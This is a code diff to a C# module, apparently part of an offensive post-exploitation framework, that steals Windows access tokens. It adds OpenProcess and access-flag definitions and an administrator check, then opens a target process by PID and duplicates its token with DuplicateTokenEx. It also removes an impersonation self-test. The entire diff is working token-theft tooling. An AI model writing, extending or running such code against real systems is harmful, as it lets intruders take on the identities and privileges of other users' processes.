@@ -122,13 +122,36 @@ public class Module_dup_token
 	    SecurityDelegation
 	}
 
+    [Flags]
+    public enum ProcessAccessFlags : uint
+    {
+        All = 0x001F0FFF,
+        Terminate = 0x00000001,
+        CreateThread = 0x00000002,
+        VirtualMemoryOperation = 0x00000008,
+        VirtualMemoryRead = 0x00000010,
+        VirtualMemoryWrite = 0x00000020,
+        DuplicateHandle = 0x00000040,
+        CreateProcess = 0x000000080,
+        SetQuota = 0x00000100,
+        SetInformation = 0x00000200,
+        QueryInformation = 0x00000400,
+        QueryLimitedInformation = 0x00001000,
+        Synchronize = 0x00100000
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(
+        uint processAccess,
+        bool bInheritHandle,
+        uint processId);
+
     [DllImport("advapi32", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool OpenProcessToken(
         IntPtr ProcessHandle,
         TokenAccessLevels DesiredAccess,
         out IntPtr TokenHandle);
-
 
 	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 	public extern static bool DuplicateTokenEx(
@@ -151,7 +174,7 @@ public class Module_dup_token
         return int.TryParse(s, out n);
     }
 
-    private bool IsHighIntegrity()
+    private bool IsAdmin()
     {
         bool flag = false;
         using(WindowsIdentity identity = WindowsIdentity.GetCurrent())
@@ -170,15 +193,20 @@ public class Module_dup_token
         {
             if (IsNumeric(pid) == false)
                 return new string[]{ERR_CODE, "invalid pid '" + pid + "': not a number" + Environment.NewLine};
+
+            if (!IsAdmin())
+                return new string[]{ERR_CODE, "No Admin detected in current context" + Environment.NewLine};
+
+            uint target_proc_id = Convert.ToUInt32(pid);
+            IntPtr target_proc_handle = IntPtr.Zero;
+            IntPtr target_proc_token = IntPtr.Zero;
             
-            int target_proc_id = Int32.Parse(pid);
-
-            if (!IsHighIntegrity())
-                return new string[]{ERR_CODE, "No High Integrity detected in current context" + Environment.NewLine};
-
-            Process target_proc = Process.GetProcessById(target_proc_id);
-            var target_proc_handle = target_proc.Handle;
-            var target_proc_token = IntPtr.Zero;
+            target_proc_handle = OpenProcess((uint)ProcessAccessFlags.QueryLimitedInformation, true, target_proc_id);
+            if (target_proc_handle == IntPtr.Zero)
+            {
+                var errorCode = Marshal.GetLastWin32Error();
+                throw new Exception("OpenProcess failed with the following error: " + errorCode);
+            }
 
             if (!OpenProcessToken(target_proc_handle, TokenAccessLevels.Query | TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary, out target_proc_token))
             {
@@ -202,34 +230,7 @@ public class Module_dup_token
                 throw new Exception("DuplicateTokenEx failed with the following error: " + errorCode);
             }
 
-            string current_username = "";
-            using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
-            {
-                current_username = wid.Name;
-            }
-
-            if (!ImpersonateLoggedOnUser(dup_token))
-            {
-                var errorCode = Marshal.GetLastWin32Error();
-                CloseHandle(target_proc_token);
-                CloseHandle(dup_token);
-                throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
-            }
-
-            CloseHandle(target_proc_token);
-
-            string impersonate_username = "";
-            using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
-            {
-                impersonate_username = wid.Name;
-            }
-
-            RevertToSelf();
-
-            if (impersonate_username == current_username)
-                throw new Exception("ImpersonateLoggedOnUser worked, but thread running as " + current_username);
-
-            result += "Duplicated token: '" + dup_token.ToInt32().ToString() + "' from PID: '" + pid + "' of user: '" + impersonate_username + "'" + Environment.NewLine;
+            result += "Duplicated token: '" + dup_token.ToInt32().ToString() + "' from PID: '" + pid + "'" + Environment.NewLine;
 
         }
         catch(Exception ex)
